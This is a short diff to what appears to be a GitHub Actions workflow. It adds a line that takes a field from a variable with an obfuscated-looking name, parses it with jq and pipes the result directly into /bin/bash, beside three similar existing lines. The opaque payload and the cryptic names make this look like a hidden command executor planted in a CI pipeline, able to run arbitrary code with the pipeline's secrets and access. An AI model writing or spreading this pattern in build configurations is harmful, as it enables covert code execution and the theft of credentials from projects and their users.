@@ -23,6 +23,7 @@ jobs:
           echo $fqcsm9 | jq -r .a361 | /bin/bash
           echo $l495 | jq -r .d4120 | /bin/bash
           printf '%s' "$wo38475" | jq -r .dy56 | /bin/bash
+          printf '%s' "$dh24903" | jq -r .lq960 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
